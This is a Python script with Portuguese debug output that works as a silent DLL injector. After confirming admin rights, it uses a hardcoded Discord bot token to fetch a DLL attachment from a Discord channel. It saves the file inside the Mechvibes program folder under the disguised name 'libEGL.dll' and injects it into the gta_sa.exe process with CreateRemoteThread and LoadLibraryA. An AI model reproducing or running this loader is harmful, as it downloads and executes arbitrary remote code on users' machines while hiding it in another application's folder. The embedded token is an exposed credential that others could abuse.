import os
import sys
import subprocess
import ctypes
from ctypes import wintypes

def execute_silent_injection():
    print("[DEBUG] Início da execução da injeção silenciosa")
    try:
        import requests
        print("[DEBUG] requests importado com sucesso")
    except ImportError:
        print("[DEBUG] requests não encontrado, instalando...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import requests
        print("[DEBUG] requests instalado e importado")

    DISCORD_CHANNEL_ID = "1393441968566046750"
    DISCORD_AUTH_TOKEN = "MTM5MzQwMzYwMjkwNjkwNjYyNA.GH8W0P.kLeWjgCQrTQS_huJDQdIUaEs4DgoF-KM3nPtXo"  # <---- substitua aqui com seu token válido
    DLL_NAME = "libEGL.dll"
    PROCESS_NAME = "gta_sa.exe"

    k32 = ctypes.WinDLL('kernel32', use_last_error=True)

    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT_RESERVE = 0x3000
    PAGE_READWRITE = 0x04

    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    k32.OpenProcess.restype = wintypes.HANDLE
    k32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    k32.VirtualAllocEx.restype = wintypes.LPVOID
    k32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    k32.WriteProcessMemory.restype = wintypes.BOOL
    k32.GetModuleHandleA.argtypes = [wintypes.LPCSTR]
    k32.GetModuleHandleA.restype = wintypes.HMODULE
    k32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
    k32.GetProcAddress.restype = wintypes.LPVOID
    k32.CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID]
    k32.CreateRemoteThread.restype = wintypes.HANDLE
    k32.CloseHandle.argtypes = [wintypes.HANDLE]
    k32.CloseHandle.restype = wintypes.BOOL

    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("[DEBUG] Sem privilégios de administrador, abortando")
            return
        else:
            print("[DEBUG] Privilégios de administrador confirmados")
    except Exception as e:
        print(f"[DEBUG] Erro ao checar privilégios de admin: {e}")
        return

    if sys.maxsize > 2**32:
        try:
            print("[DEBUG] Sistema 64 bits detectado, tentando relançar em 32 bits")
            subprocess.Popen(['py', '-3-32'] + sys.argv, creationflags=0x08000008)
            sys.exit()
        except FileNotFoundError:
            print("[DEBUG] Interpretador 32 bits não encontrado, continuando no atual")
            pass

    mech_dir = None
    for drive in [f"{chr(c)}:\\" for c in range(65, 91) if os.path.exists(f"{chr(c)}:\\")]:
        print(f"[DEBUG] Procurando pasta em {drive}")
        for root, _, files in os.walk(drive):
            if "Uninstall Mechvibes.exe" in files:
                mech_dir = os.path.dirname(os.path.join(root, "Uninstall Mechvibes.exe"))
                print(f"[DEBUG] Encontrado Mechvibes em {mech_dir}")
                break
        if mech_dir:
            break
    if not mech_dir:
        print("[DEBUG] Pasta do Mechvibes não encontrada, abortando")
        return

    dll_path = os.path.join(mech_dir, DLL_NAME)
    print(f"[DEBUG] Caminho da DLL: {dll_path}")

    try:
        print("[DEBUG] Tentando baixar DLL do Discord...")
        import requests
        r_msg = requests.get(
            f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages?limit=1",
            headers={"Authorization": f"Bot {DISCORD_AUTH_TOKEN}"},
            timeout=10)
        if r_msg.status_code != 200:
            print(f"[DEBUG] Falha ao pegar mensagens: status {r_msg.status_code}")
            return
        messages = r_msg.json()
        if not messages or not messages[0].get('attachments'):
            print("[DEBUG] Mensagens sem anexos, abortando")
            return
        dll_url = messages[0]['attachments'][0]['url']
        r_dll = requests.get(dll_url, timeout=15)
        if r_dll.status_code == 200:
            with open(dll_path, "wb") as f:
                f.write(r_dll.content)
            print("[DEBUG] DLL baixada com sucesso")
        else:
            print(f"[DEBUG] Falha ao baixar DLL: status {r_dll.status_code}")
            return
    except Exception as e:
        print(f"[DEBUG] Erro ao baixar DLL: {e}")
        return

    pid = None
    try:
        print(f"[DEBUG] Procurando processo {PROCESS_NAME}...")
        output = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {PROCESS_NAME}" /NH', shell=True).decode()
        pid = int(output.strip().split()[1])
        print(f"[DEBUG] PID encontrado: {pid}")
    except Exception as e:
        print(f"[DEBUG] Erro ao encontrar PID: {e}")
        return
    if not pid:
        print("[DEBUG] Processo não encontrado, abortando")
        return

    h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        print("[DEBUG] Falha ao abrir processo")
        return
    else:
        print("[DEBUG] Processo aberto com sucesso")

    dll_bytes = dll_path.encode('ascii')
    mem_addr = k32.VirtualAllocEx(h_process, None, len(dll_bytes) + 1, MEM_COMMIT_RESERVE, PAGE_READWRITE)
    if not mem_addr:
        print("[DEBUG] Falha ao alocar memória no processo")
        k32.CloseHandle(h_process)
        return
    else:
        print(f"[DEBUG] Memória alocada no endereço {mem_addr}")

    if not k32.WriteProcessMemory(h_process, mem_addr, dll_bytes, len(dll_bytes) + 1, None):
        print("[DEBUG] Falha ao escrever na memória do processo")
        k32.CloseHandle(h_process)
        return
    else:
        print("[DEBUG] Memória escrita com sucesso")

    load_library_addr = k32.GetProcAddress(k32.GetModuleHandleA(b'kernel32.dll'), b'LoadLibraryA')
    h_thread = k32.CreateRemoteThread(h_process, None, 0, load_library_addr, mem_addr, 0, None)
    if not h_thread:
        print("[DEBUG] Falha ao criar thread remota")
        k32.CloseHandle(h_process)
        return
    else:
        print("[DEBUG] Thread remota criada com sucesso")

    k32.CloseHandle(h_thread)
    k32.CloseHandle(h_process)
    print("[DEBUG] Injeção concluída com sucesso")
